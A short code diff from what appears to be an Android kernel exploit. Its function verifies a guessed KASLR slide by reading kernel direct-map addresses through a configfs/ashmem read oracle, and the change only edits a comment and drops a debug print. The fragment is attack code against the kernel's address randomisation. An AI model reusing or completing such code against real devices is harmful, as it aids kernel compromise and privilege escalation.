@@ -86,7 +86,7 @@ static int verify_slide_virtual(int ashmem_fd) {
        idx < sizeof(p0_fingerprints) / sizeof(p0_fingerprints[0]);
        idx++) {
     uintptr_t slide = p0_fingerprints[idx].slide;
-    /* CRITICAL: use DIRECT MAP virtual address, not kernel text address */
+    /* Use DIRECT MAP virtual address, not kernel text address */
     uintptr_t probe_base = APP_KERNEL_PAGE_KSNITCH_IDENTITY_BASE
                          + (uintptr_t)kernel_phys_load
                          + P0_ORACLE_PROBE_OFFSET
@@ -98,8 +98,6 @@ static int verify_slide_virtual(int ashmem_fd) {
       uint64_t value = 0;
       ssize_t ret = configfs_read_once(ashmem_fd, addr, &value, sizeof(value));
       if (ret != (ssize_t)sizeof(value)) {
-        pr_info("virtual verify: slide=%06zx word=%d read failed ret=%zd\n",
-                slide, w, ret);
         match = 0;
         break;
       }
